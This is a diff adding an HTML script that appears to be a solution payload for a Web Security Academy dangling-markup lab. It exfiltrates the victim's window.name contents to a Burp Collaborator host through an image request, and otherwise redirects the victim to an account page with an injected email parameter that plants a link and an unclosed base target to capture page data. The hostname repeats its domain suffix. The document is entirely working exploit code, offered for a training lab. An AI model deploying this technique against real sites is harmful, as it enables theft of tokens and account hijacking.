@@ -1,0 +1,7 @@
+<script>
+if(window.name) {
+    new Image().src='//eo6q3c85k6yivls0h1am5kix3o9ex3.burpcollaborator.net.burpcollaborator.net?'+encodeURIComponent(window.name);
+    } else {
+        location = 'https://your-lab-id.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://your-exploit-server-id.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+}
+</script> 
